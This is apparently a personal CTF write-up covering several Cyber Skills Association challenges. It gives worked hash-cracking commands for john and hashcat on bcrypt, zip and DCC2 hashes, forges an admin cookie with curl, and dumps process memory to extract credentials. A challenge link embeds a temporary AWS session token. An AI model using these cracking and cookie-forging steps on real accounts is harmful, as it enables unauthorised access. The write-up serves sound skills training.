# CSA_23_Preseason
# CTF Writeups
## Writeups for the ADF Cyber Skills Association Pre-Season challenges.
There were 30 challenges in total, XX of which I was able to solve. The ones left unsolved were:
- Cipher This (Cryptography)
  - Had no idea how to proceed with this one. The only given clue was LPUKWOKVIRYQ
- Customary, my dear Watson (Reverse Engineering)
  - REVENG is not my thing obviously but I did start to learn a little about assembly language, obviously not enough though.
  - This one appeared to required an input file called 'Sherlock.jpeg' of a certain width and height. If that was satisfied, it would write a file called 'data.ana'
  - I got so far as working out the ratio required for the image and it would create data.ana but that was it.
- FUD Crypter Alpha (Reverse Engineering)
  - As above, REVENG is not my thing.
  - Running the binary printed 'some of the flag' which was 'FLA' then 'Flag? What flag?'
  - I couldn't work out anything beyond that even when looking at the binary in IDA/Ghidra/GDB/Radare2
- Nature is very fragile (Steganography)
  - This one was hard for a very obvious reason. It was created on this [website](https://www.pelock.com/products/steganography-online-codec)
  - My deduction was that brute force was the only way to tackle this one given the methods of encryption etc stated on the site
  - I tried writing a script that might aid in reversing the process but no luck
  - I ended up writing a script that engages the website (using selenium) to upload the image then iterate through the rockyou password list but this is a very slow process
  - I had 8 VMs running but still had no luck.
  - I'm leaving it running though just for fun now.
- Static (Steganography)
  - Had no idea with this one
  - Looked like a smaller image placed over the main image
  - Got nowhere.

Below are my writes to those that I did solve.

### AdminPasswordHunt
Description - They told me to Rock your API, so I built an API that rocks 
[Zip File](https://github.com/gnarkill78/CSA_S3_2023/blob/main/rockapi.zip)! 
What's the admin's password? URL port: 8080 Wrap it in FLAG{}

Solution:
Firstly I worked out that the url to get a login prompt is
http://platf-loadb-6nnucudws0q7-c79f2644d7a58110.elb.ap-southeast-2.amazonaws.com:8080/api/users

This is also Basic Authentication meaning the username:password is sent as base64

Brute forcing using Burp and Hydra were no good (had to remember to force base64)

I opened Ghidra to look at the binary deeper and found what looked like a password 'apiadminp@ssw0rd'

After many many many many attempts with this password, of which I am sure I had tried this several times, I was able to login,
using the URL http://platf-loadb-6nnucudws0q7-c79f2644d7a58110.elb.ap-southeast-2.amazonaws.com:8080/api/users
with username 'apiadmin' and password 'apiadminp@ssw0rd' which then presented the following in JSON form:
```
{
    "users": [
        {
            "id": "1",
            "username": "admin",
            "password": "$2a$05$1tmIXGzh9/86ZdwxS1yqYuLCn76TM6CQuG9S6AqP5wEMdmXwrCyF6",
            "description": "I am groot"
        },
        {
            "id": "2",
            "username": "bob",
            "password": "$2a$05$nf0KzyjlgnWD8y6Rwq5UzON5gTqH62.OxS2Y0KpZVVepvwrRhAJ1C",
            "description": "I wish I am groot"
        }
    ]
}
```
From there, I saved the hash to a file and used hashid to identify the hash for admin as bcrypt
```
	└─$ hashid -m hash.txt
	--File 'hash.txt'--
	Analyzing '$2a$05$1tmIXGzh9/86ZdwxS1yqYuLCn76TM6CQuG9S6AqP5wEMdmXwrCyF6'
	[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
	[+] Woltlab Burning Board 4.x
	[+] bcrypt [Hashcat Mode: 3200]
	--End of file 'hash.txt'--       
```
Tried hashcat to crack but it errored. I used john the ripper in the end:
```
	└─$ john --wordlist=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --format=bcrypt hash.txt
	Using default input encoding: UTF-8
	Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
	Cost 1 (iteration count) is 32 for all loaded hashes
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	motorola         (?)
	1g 0:00:00:00 DONE (2023-09-08 17:12) 1.136g/s 2372p/s 2372c/s 2372C/s 268..264
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed.
```
Password was 'motorola'

:+1: FLAG{motorola}
<hr>

### IntrusionDetection
Description - I had a call with a call center and they said they installed an anti-virus on my machine, but I've noticed my computer 
mouse moving when I'm not touching it. I took it into a repair center and they couldn't figure it out but said I should take it to a 
specialist to find out what's happening.

I tried to open the file but it's got a password so please help me!

The Flag is in the format of FLAG{<creator_account>_<new_account>}

Solution:
Bruteforce the [Zip File](https://github.com/gnarkill78/CSA_S3_2023/blob/main/machine.zip)

I used zip2john in kali - zip2john logs.zip > logs.txt
then
sudo john --format=zip logs.txt
which gave output
```
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 52577 to 526836
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
starwars         (logs.zip/application.evtx)
starwars         (logs.zip/sec.evtx)
starwars         (logs.zip/system.evtx)
3g 0:00:00:02 DONE 2/3 (2023-08-19 17:19) 1.456g/s 57778p/s 65734c/s 65734C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Open the sec.evtx file in Windows Event Viewer and search through the logs

Find user 'sododgy'

:+1: FLAG{vboxuser_sododgy}
<hr>

### PubkeyExplorer
Description - I told my friends I wanted to build an authentication system like the one they use with JWTs but cooler! They 
said I need a pub key to sign and verify cookies.. Pub key? To which pub?
[Zip File](https://github.com/gnarkill78/CSA_S3_2023/blob/main/pubauthsrv.zip)

Solution:
This was a pain in the you know what!!

Using the original pubserv.go code, I eventually hard coded the pubkey string
that was being returned from the website given in the challenge.

This is what I added which allowed me to use the pubkey as a byte array instead, meaning when I ran the
entire program locally, I could register a user named admin (modify code again) and then login as admin
to get a cookie.

```
const pubkeyStr = "srRjBagOW-bneJMshdDgKm5kgnRTx0o9yxzXf-VcJMry3sSmg62JWG_Q7rvU-F5K6PdrJ7Pk8u6thAkRFk0gOA"

func init() {
    pubkey = &[64]byte{}
    decodedPubstr, err := base64.RawURLEncoding.DecodeString(pubkeyStr)
    if err != nil {
        log.Fatal("Error decoding pubkeyStr:", err)
        return
    }
    copy(pubkey[:], decodedPubstr)
}
```

The pubkey array ended up as [247 126 222 70 27 196 209 186 177 243 91 119 27 218 59 244 179 164 145 30 2 43 208 178 134 251 124 249 2 126 179 81 246 3 171 146 194 233 20 35 64 152 82 87 55 89 185 136 1 173 213 78 142 9 155 212 69 228 93 0 127 128 243 153]

I tested it locally and on the site using a user called rocky to check I got the same cookie
```
┌──(user㉿violet)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "rocky","password": "password"}' 127.0.0.1:80/rego
"rocky"                                                                                                                                                                                                                                                                       
┌──(user㉿violet)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "rocky","password": "password"}' 127.0.0.1:80/login
{
    "cookie": "P5Q-c_EQWhkUbagDC3klwsv0SQ6JdK9zDZLws3PzWjjdjcqiHlJMWLsxKDraTgU6za_fOXuaEOa5i2NhEmY0DnJvY2t5"
} 
┌──(user㉿violet)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "rocky","password": "password"}' platf-loadb-1dnrzrpf9f9mt-1293434102.ap-southeast-2.elb.amazonaws.com:80/rego
"rocky"                                                                                                                                                                                                                                                                       
┌──(user㉿violet)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "rocky","password": "password"}' platf-loadb-1dnrzrpf9f9mt-1293434102.ap-southeast-2.elb.amazonaws.com:80/login
{
    "cookie": "P5Q-c_EQWhkUbagDC3klwsv0SQ6JdK9zDZLws3PzWjjdjcqiHlJMWLsxKDraTgU6za_fOXuaEOa5i2NhEmY0DnJvY2t5"
} 
```
Did the same with admin and voila
```
──(user㉿violett)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "admin","password": "password"}' 127.0.0.1:80/rego
"admin"                                                                                                                                                                                                                                                                       
┌──(user㉿violett)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "admin","password": "password"}' 127.0.0.1:80/login
{
    "cookie": "NA3kOxFS095PEaMdQa97fuHlMGU_KY4GNk1NdUHbWxpRMxSxCSJiwlvS5jv2dmPHB2rXkCcgl7eaOIG4sFWpDmFkbWlu"
} 
```
So when I logged in as admin, my cookie was
NA3kOxFS095PEaMdQa97fuHlMGU_KY4GNk1NdUHbWxpRMxSxCSJiwlvS5jv2dmPHB2rXkCcgl7eaOIG4sFWpDmFkbWlu

I then used burp suite repeater to add the cookie to a GET request for /secret and bingo, the flag.

:+1: FLAG{th3_publ1c_k3y_was_the_priv4te_key}
<hr>

### RedditSleuth
Description - Redditective We believe that this redditor leaked confidential information to our rivals and we need
you to take a look. Could you see if there is any leads from his account? u/ChaoticLlama12345 Flag format:
FLAG{text_text_text_text_text}

Solution:
Go to waybackmachine

Search the first post - https://www.reddit.com/user/ChaoticLlama12345/comments/14f9iee/hi_reddit/

Indicates it's been saved 2 times - click the date on the calendar

Open the pastebin link
```
Agent Delta, this is a covert transmission for your eyes only. The mission is a go, codename "Operation Midnight Serpent."
Target acquisition confirmed at coordinates 39.8712° N, 104.9962° W. 

Exercise extreme caution as the target is considered high-profile and surrounded by tight security.
 
Your primary objective is to infiltrate the facility undetected and retrieve the classified documents from the secure vault
in Room 315. 

Intel suggests that the vault's access code is a sequence of numbers related to the target's birthdate. Use your exceptional
lock-picking skills to gain entry.
 
Secondary objective: Extract any information on "Project Pandora" from the mainframe located in the basement. 

This project poses a significant threat to national security, and any data acquired will aid our ongoing investigation.
 
Remember, time is of the essence. Complete the mission swiftly and discreetly, leaving no trace of your presence. Be aware
of potential double agents within the organization. Trust no one.
 
Once you have successfully obtained the documents and extracted the data, rendezvous with your extraction team at the
designated location: The Old Mill by the river, precisely at 2300 hours. 

Prepare for immediate extraction and secure the sensitive materials.
 
Exercise extreme caution, Agent Delta, as the success of "Operation Midnight Serpent" rests in your capable hands. 

Trust your training, rely on your instincts, and above all, maintain your cover. Good luck, Agent. The fate of our nation
depends on your success.
 
This transmission will self-destruct in 5...4...3...2...1...

FLAG{y0u_th1nk_y0ud_g3t_4w45}
``` 
:+1: FLAG{y0u_th1nk_y0ud_g3t_4w45}
<hr>

### RomanNetChallenge
Description - In ancient times, the Romans used to philosophize and hang out at the aqueducts. 
We now live in the age of the interet and the romans have gotten better at their security! 
Are you up for the challenge? Let the decryption begin in the quest for hidden knowledge!

Flag format: FLAG{thisistheflag} [Zip File](https://task-file-storage190923-prod.s3.ap-southeast-2.amazonaws.com/public/cipher81NlmRiDH.zip?x-amz-content-sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&x-amz-user-agent=aws-amplify%2F5.3.10+storage%2F2+framework%2F1&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAXBFBJLIO3ZAWPONH%2F20231024%2Fap-southeast-2%2Fs3%2Faws4_request&X-Amz-Date=20231024T085735Z&X-Amz-SignedHeaders=host&X-Amz-Expires=900&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBkaDmFwLXNvdXRoZWFzdC0yIkYwRAIgY%2Bt%2BRexblmD8FFqoJFdRvzWMVJflomiIMv%2FaZsaGPFgCIEBL2PhiS7LZoZ0ffHdWzhQRg0hANaYJzXL%2BRY65ueQfKuIECEIQBBoMNDgzNTIyMDc1MTY1IgyZHAJCRpyNJjulZ14qvwS0RlDNpKXveY9ptmlf4I44h8xvOBExFLHkPz%2BNuKpMosMISIFHEb23d%2Bb%2BfBQn5RcZmJ8xbb7bf7vSq0fFRZPsn4Ewqmi7dZVypgg13hg7ufoBX%2B1V1iPxhdbQ3lnRkITMXBKwRKrpWCn9h%2FbK9Mxban5If3Yzj1B4mG0VQbpdjTcOszdOCDCoR65lREmEbPdS6SDclCrnMcr%2Fa3I5N34CBg9FJTI0ubEFoWjdTjnwYjhbA9oZCBu1DJvMvO%2BUcfDG0nOqoa25ZQ3zksif%2BScZnVUGCxorSxawFDyV6YXT%2F7DbfHPF1kATpCj3ieClbYr3ecmmOjfryD8E11GvYDjrwXiJr8gdDKzMUKpMTY2IEugkQoUhCtXlG46vFBljV9HRbr84MiPYAItw7i7MzgoxerGgK3keoof7M3rHJSg3zVRuTac2L%2BPbyxnurGgeT%2FTJU%2BSFDtgDfgWVAv%2FjCtdO5OpcUwOJiguz%2FV9OvII4nZnRYhibeFqXQhtRG4uAV8yi2fGNy87NIwcT59NPFlnqJBy257b9y%2FrHLLrsurT%2ByzGHUdIHLOedSSBo80%2FhgRBZ6FAh%2FU8XMVnkR9n6W%2B%2B3PslQoDY6G03D6dMywTaT6Q%2BB1tfSO0%2FJzB5dDd5Flj%2BBhOpgChKk5SjPaw94UP04N5NCmFRVUDZu8ST2za%2BXFLKPHdL2q0U2%2B27uebS%2FY3Eat5WFDNBh419WuxMghKcIMDnX5sssGoZ1Utlw2v%2BwUSmWeIuMW8aYK0Q%2BulBDljCxjd6pBjqGAmsEx1uhCwWAC8aJ9vKs3T4zuhLU0i6%2BRRFVPAy6ZZifeHn0BGZDOFhwmGtnjbCYRjTWKYoZGnKmUS5txc8vjoWCqFdLnmAo95ZmSX9p9KmS3AuRC4kWtvGqa1CD5isSAauFvQxNphQI9DTfAKR0bKWccTikhbVPALdIW%2FUPLDvNU5ktbGaDKxdLTxyT2zeA2PX%2FhrFrGWsYB4DQ9xHnVRrNR8gwoswT%2B8SmHbAu8DawI58sPFOlUDwFXoSru9xQhroIZZq%2BesijxxgXWSmHSTPoJdaAiKpVJxqJ1I2fygkK68MJkIM2OHFLY7ZEZfehtyHa1lQUOhkmfFLyaiBy4gTGIBTjcl4%3D&X-Amz-Signature=5da404404abad8c6b253f1e43aa9906d28794b2c4e3adc308e3d93333b342ec8)

JAFKQ/1uh6u.@u1/7.@6/q4uy6W

Solution:
After trying many forms of different ciphers I had an apiphany about keyboards.

Turns out, after looking at my keyboard and seeing things that started to align,
it's actually a keyboard shift cipher (found on dcode)

https://www.dcode.fr/keyboard-shift-cipher

:+1: FLAG{m0rd3rnr0m4n3mp1re3}
<hr>

### SecretSweeper
Description - I made an authentication client for my secret server! It has some saved creds inside it, but you'll never find it
because I protected the binary script! Ha!
[Hidden Creds](https://github.com/gnarkill78/CSA_S3_2023/blob/main/Hidden%20Creds.zip)

Solution:
Turns out didn't need to run any deobfuscation tool, all that was needed was a memory dump.

Found a script called memdump.py (here - https://medium.com/@liad_levy/reverse-pyarmor-obfuscated-python-script-using-memory-dump-technique-9823b856be7a)

Kicked off script.py and in another window, ran ps -as to find the PID
Ran memdump.py against that PID which created a PID.dump file
Ran strings on dump file (strings PID.dump > process.dump)
Then cat process.dump | grep FLAG and voila.

:+1: FLAG{Y0u_c4n_just_rec3ive_creds}
<hr>

### Site Shield Breach
Description - Recently I had to backup my website database in case it got hacked. "Best practise" or something. 
I can't help but think if someone gets their hands on the backup they can break my actual website.

URL port: 5000

Flag format: FLAG{random_flag_f0r_this_website}

Solution:
Extracting the zip reveals a tarball archive

Extracting that gives the complete backups

Search through each folder looking for juicyness

I found db.sqlite3 in the folder starting 32e6d.

Opening that in notepad reveals to accounts and hashed passwords

taking the hash for admin - 5beb1b83d944d0f81b08704490f029e083e49b6159b12eb6fcbedef359939fdf

and putting in crackstation.net, it reveals the result as fericita pana la ultima suvitza

Going to the website for the challenge - http://platf-loadb-lds4m4cnqtwz-e7e9345ee4d3f184.elb.ap-southeast-2.amazonaws.com:5000

and using admin/fericita pana la ultima suvitza the flag is revealed

:+1: FLAG{treasure_is_f0und_in_backups}
<hr>

### URL Unravel
Description - One of our junior software engineers build this script. What is the URL it is getting the user data from?
```
import tweepy
import requests

auth = tweepy.OAuth2BearerHandler("Bearer Token here")
api = tweepy.API(auth)

user = api.get_user(screen_name="joebiden")

for a, v in user.__dict__.items():
    if "url" not in str(a):
        continue

    r = requests.get(v)
    
    # Hmm interesting 
    if "hacker" in str(r.headers):
        print(r.headers)
        
    # Download images for further analysis
    if r.headers["Content-Type"] in ("image/png", "image/jpeg", "image/jpg"):
        with open(a+'.jpg', 'wb') as handler:
            handler.write(r.content)
```
Flag format: FLAG{http://completeAPIendpoint}

Solution:
I spent a lot of time trying to get the code to run using twitter dev creds to no avail.

In the end, I did this from my phone in bed late one night using ChatGPT.

The prompt:
Explain this code
```
import tweepy
import requests

auth = tweepy.OAuth2BearerHandler("Bearer Token here")
api = tweepy.API(auth)

user = api.get_user(screen_name="joebiden")

for a, v in user.__dict__.items():
    if "url" not in str(a):
        continue

    r = requests.get(v)
    
    # Hmm interesting 
    if "hacker" in str(r.headers):
        print(r.headers)
        
    # Download images for further analysis
    if r.headers["Content-Type"] in ("image/png", "image/jpeg", "image/jpg"):
        with open(a+'.jpg', 'wb') as handler:
            handler.write(r.content)
```
Response:
```
This code is written in Python and uses the Tweepy and Requests libraries to interact with the Twitter API and 
download images from a user's Twitter profile. Here's a breakdown of what the code does:

    Imports the necessary libraries: tweepy for working with the Twitter API and requests for making HTTP requests.

    Initializes authentication with the Twitter API using a Bearer token.

    Creates a Tweepy API object using the previously configured authentication.

    Retrieves information about a Twitter user with the screen name "joebiden" using the api.get_user() method 
and stores it in the user variable.

    Iterates through the attributes (properties) of the user object using user.__dict__.items(). It's checking 
if any attribute name contains the substring "url". If it doesn't, the loop continues to the next attribute.

    For each attribute that contains "url" in its name, the code sends an HTTP GET request to the URL stored in 
the attribute's value (v). The response is stored in the variable r.

    The code checks if the response headers contain the string "hacker". If they do, it prints the headers. This 
part seems to be a form of debugging or exploration to identify potential suspicious headers.

    The code then checks if the "Content-Type" header in the response is one of "image/png", "image/jpeg", or 
"image/jpg". If it matches, the code assumes that the response contains an image and saves it to a file. The 
filename is derived from the attribute's name (a) with a ".jpg" extension.

In summary, this code fetches the Twitter profile of a user with the screen name "joebiden", checks for URLs in 
the user object, makes requests to those URLs, inspects response headers for potential signs of hacking, and 
downloads and saves images from those URLs if they are of valid image types.
```
My response question:
```
Is there a way to determine the full search URL that tweepy would create to the Twitter api endpoint for this code?
```
Response:
```
Yes, you can determine the full search URL to the Twitter API endpoint using the provided code. The code doesn't 
explicitly perform a search operation, but it interacts with a user's profile data using the Twitter API. To find 
the URL for the Twitter API endpoint that retrieves a user's profile information, you can combine the base Twitter 
API URL with the endpoint specific to retrieving user information.

The base Twitter API URL is: https://api.twitter.com/1.1/

The endpoint for retrieving user information is: users/show.json

When you combine these two components, you get the full URL for retrieving the profile information of a user with 
the screen name "joebiden":

https://api.twitter.com/1.1/users/show.json?screen_name=joebiden

Please note that Twitter's API endpoints and structure may change over time, so it's important to refer to the 
official Twitter API documentation for the most accurate and up-to-date information.
```
:+1: FLAG{https://api.twitter.com/1.1/users/show.json?screen_name=joebiden}
<hr>

### Windows Domain Whodunit
Description - Someone sent me their mimikatz output dumping the SECURITY and SYSTEM hives of a windows machine.. can you figure this out for me? 
username: flaguser
hash: 2777630c7ebd1069dc6f8ad044caed41
They said it was something to do with a domain joined Windows 10 computer..

Flag format: FLAG{input_the_flag_here}

Solution:
Taking the username and password, combined them and checked it with hashid.
```
──╼ $hashid hash.txt 
--File 'hash.txt'--
Analyzing 'flaguser:2777630c7ebd1069dc6f8ad044caed41'
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
```
Using this, I modified the hash to read in DCC2 format then ran that through hashcat using rockyou.
```
└──╼ $hashcat -m2100 '$DCC2$10240#flaguser#2777630c7ebd1069dc6f8ad044caed41' /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-6770HQ CPU @ 2.60GHz, 29885/29949 MB (8192 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 66 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
$DCC2$10240#flaguser#2777630c7ebd1069dc6f8ad044caed41:number1hacker
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Domain Cached Credentials 2 (DCC2), MS Cache 2
Hash.Target......: $DCC2$10240#flaguser#2777630c7ebd1069dc6f8ad044caed41
Time.Started.....: Tue Oct 24 19:41:11 2023, (3 mins, 25 secs)
Time.Estimated...: Tue Oct 24 19:44:36 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6985 H/s (14.60ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1433600/14344385 (9.99%)
Rejected.........: 0/1433600 (0.00%)
Restore.Point....: 1429504/14344385 (9.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-10239
Candidates.#1....: nutty_family -> noryanty

Started: Tue Oct 24 19:41:10 2023
Stopped: Tue Oct 24 19:44:37 2023
```
:+1: FLAG{number1hacker}
<hr>
